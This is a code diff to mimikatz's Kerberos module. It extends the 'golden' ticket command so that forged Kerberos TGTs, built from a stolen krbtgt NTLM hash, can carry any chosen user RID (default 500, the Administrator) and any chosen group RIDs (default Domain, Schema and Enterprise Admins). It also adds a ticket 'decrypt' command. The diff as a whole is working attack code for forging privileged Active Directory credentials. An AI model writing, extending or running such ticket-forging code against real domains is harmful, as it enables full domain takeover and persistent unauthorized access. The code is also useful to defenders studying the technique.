@@ -18,6 +18,10 @@ const KUHL_M_C kuhl_m_c_kerberos[] = {
 	{kuhl_m_kerberos_tgt,		L"tgt",			L"Retrieve the current TGT"},
 	{kuhl_m_kerberos_purge,		L"purge",		L"Purge ticket(s)"},
 	{kuhl_m_kerberos_golden,	L"golden",		L"Willy Wonka factory"},
+#ifdef KERBEROS_TOOLS
+	{kuhl_m_kerberos_decode,	L"decrypt",		L"Decrypt encoded ticket"},
+	{kuhl_m_kerberos_pac_info,	L"pacinfo",		L"Some infos on PAC file"},
+#endif
 };
 
 const KUHL_M kuhl_m_kerberos = {
@@ -350,18 +354,41 @@ wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE
 	return buffer;
 }
 
-LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize)
+GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
+
+LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm,
+	DWORD dwId, DWORD* pdwGroups, DWORD dwGroupCount, PBYTE* ticketBuffer, DWORD* ticketBufferSize)
 {
 	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
-	DWORD i, j;
+	DWORD i, j, nbGroups = sizeof(defaultGroups) / sizeof(defaultGroups[0]);
 	PISID pSid = NULL;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
 	NTSTATUS result = STATUS_UNSUCCESSFUL;
+	PGROUP_MEMBERSHIP pChosenGroups = defaultGroups;
+	PGROUP_MEMBERSHIP pPassedGroups = NULL;
+
+	if (dwId == 0)
+	{
+		dwId = 500;
+	}
 
 	PRINT_ERROR(L"User: %s", szUser);
 	PRINT_ERROR(L"Domain: %s", szDomain);
 	PRINT_ERROR(L"Sid: %s", szSid);
 	PRINT_ERROR(L"Ntlm: %s", szNtlm);
+	PRINT_ERROR(L"Id: %d", dwId);
+	PRINT_ERROR(L"#Groups: %d", dwGroupCount);
+
+	if (pdwGroups != NULL && dwGroupCount > 0 && (pPassedGroups = (PGROUP_MEMBERSHIP)calloc(sizeof(GROUP_MEMBERSHIP), dwGroupCount)) != NULL)
+	{
+		for (i = 0; i < dwGroupCount; ++i)
+		{
+			pPassedGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
+			pPassedGroups[i].RelativeId = pdwGroups[i];
+		}
+		pChosenGroups = pPassedGroups;
+		nbGroups = dwGroupCount;
+	}
 
 	if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
 	{
@@ -372,15 +399,8 @@ LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWC
 				swscanf_s(&szNtlm[i*2], L"%02x", &j);
 				ntlm[i] = (BYTE) j;
 			}
-			kprintf(
-				L"Admin  : %s\n"
-				L"Domain : %s\n"
-				L"SID    : %s\n"
-				L"krbtgt : ",
-				szUser, szDomain, szSid);
-			kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 
-			if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm))
+			if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm, dwId, pChosenGroups, nbGroups))
 			{
 				*ticketBufferSize = kull_m_asn1_getSize(App_KrbCred);
 				*ticketBuffer = (BYTE*)malloc(*ticketBufferSize);
@@ -403,20 +423,26 @@ LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWC
 		LocalFree(pSid);
 	}
 
+	if (pPassedGroups)
+	{
+		free(pPassedGroups);
+	}
+
 	return result;
 }
 
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
-	DWORD i, j;
-	PCWCHAR szUser, szDomain, szSid, szNtlm, filename;
+	DWORD i, j, nbGroups, id = 500;
+	PCWCHAR szUser, szDomain, szSid, szNtlm, szId, szGroups, base, filename;
 	PISID pSid;
+	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
 
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket.kirbi");
 
-	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL))
+	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		{
@@ -426,6 +452,41 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 				{
 					if(kull_m_string_args_byName(argc, argv, L"krbtgt", &szNtlm, NULL))
 					{
+						if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
+							id = wcstoul(szId, NULL, 0);
+
+						if(kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL))
+						{
+							for(nbGroups = 0, base = szGroups; base && *base; )
+							{
+								if(wcstoul(base, NULL, 0))
+									nbGroups++;
+								if(base = wcschr(base, L','))
+									base++;
+							}
+							if(nbGroups && (dynGroups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, nbGroups * sizeof(GROUP_MEMBERSHIP))))
+							{
+								for(i = 0, base = szGroups; (base && *base) && (i < nbGroups); )
+								{
+									if(j = wcstoul(base, NULL, 0))
+									{
+										dynGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
+										dynGroups[i].RelativeId = j;
+										i++;
+									}
+									if(base = wcschr(base, L','))
+										base++;
+								}
+							}
+						}
+						if(nbGroups && dynGroups)
+							groups = dynGroups;
+						else
+						{
+							groups = defaultGroups;
+							nbGroups = sizeof(defaultGroups) / sizeof(GROUP_MEMBERSHIP);
+						}
+																		
 						if(wcslen(szNtlm) == (LM_NTLM_HASH_LENGTH * 2))
 						{
 							for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
@@ -434,15 +495,19 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 								ntlm[i] = (BYTE) j;
 							}
 							kprintf(
-								L"Admin  : %s\n"
-								L"Domain : %s\n"
-								L"SID    : %s\n"
-								L"krbtgt : ",
-								szUser, szDomain, szSid);
+								L"User      : %s\n"
+								L"Domain    : %s\n"
+								L"SID       : %s\n"
+								L"User Id   : %u\n", szUser, szDomain, szSid, id);
+							kprintf(L"Groups Id : *");
+							for(i = 0; i < nbGroups; i++)
+								kprintf(L"%u ", groups[i]);
+							kprintf(L"\nkrbtgt    : ");
+								
 							kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-							kprintf(L"Ticket : %s\n\n", filename);
+							kprintf(L"-> Ticket : %s\n\n", filename);
 
-							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm))
+							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm, id, groups, nbGroups))
 							{
 								if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
 									kprintf(L"\nFinal Ticket Saved to file !\n");
@@ -463,6 +528,9 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 		else PRINT_ERROR(L"Missing domain argument\n");
 	}
 	else PRINT_ERROR(L"Missing admin argument\n");
+
+	if(dynGroups)
+		LocalFree(groups);
 
 	return STATUS_SUCCESS;
 }
@@ -493,7 +561,7 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PISID sid, LPCBYTE krbtgt)
+PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PISID sid, LPCBYTE krbtgt, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
 {
 	NTSTATUS status;
 	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
@@ -501,8 +569,6 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	KERB_VALIDATION_INFO validationInfo = {0};
 	SYSTEMTIME st;
 	PPACTYPE pacType; DWORD pacTypeSize;
-	GROUP_MEMBERSHIP groups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
-	ULONG userid = 500;
 
 	GetSystemTime(&st); st.wMilliseconds = 0;
 
@@ -547,7 +613,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
 	validationInfo.PrimaryGroupId		= groups[0].RelativeId;
 
-	validationInfo.GroupCount = sizeof(groups) / sizeof(GROUP_MEMBERSHIP);
+	validationInfo.GroupCount = cbGroups;
 	validationInfo.GroupIds = groups;
 	
 	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, &pacType, &pacTypeSize))
@@ -583,3 +649,49 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 
 	return App_KrbCred;
 }
+
+#ifdef KERBEROS_TOOLS
+NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
+	DWORD i, j;
+	PCWCHAR szNtlm, szIn, szOut;
+	PBYTE encData, decData;
+	DWORD encSize, decSize;
+
+	if(kull_m_string_args_byName(argc, argv, L"key", &szNtlm, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
+		{
+			kull_m_string_args_byName(argc, argv, L"out", &szOut, L"out.dec");
+
+			if(kull_m_file_readData(szIn, &encData, &encSize))
+			{
+				if(wcslen(szNtlm) == (LM_NTLM_HASH_LENGTH * 2))
+				{
+					for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
+					{
+						swscanf_s(&szNtlm[i*2], L"%02x", &j);
+						ntlm[i] = (BYTE) j;
+					}
+
+					status = kuhl_m_kerberos_encrypt(KERB_ETYPE_RC4_HMAC_NT, KRB_KEY_USAGE_AS_REP_TGS_REP, ntlm, LM_NTLM_HASH_LENGTH, encData, encSize, (LPVOID *) &decData, &decSize, FALSE);
+					if(NT_SUCCESS(status))
+					{
+						if(kull_m_file_writeData(szOut, (PBYTE) decData, decSize))
+							kprintf(L"DEC data saved to file (%s)!\n", szOut);
+						else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
+					}
+					else PRINT_ERROR(L"kuhl_m_kerberos_encrypt - DEC (0x%08x)\n", status);
+				}
+				else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
+			}
+			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+		}
+		else PRINT_ERROR(L"arg \'in\' missing\n");
+	}
+	else PRINT_ERROR(L"arg \'key\' missing\n");
+	return STATUS_SUCCESS;
+}
+#endif
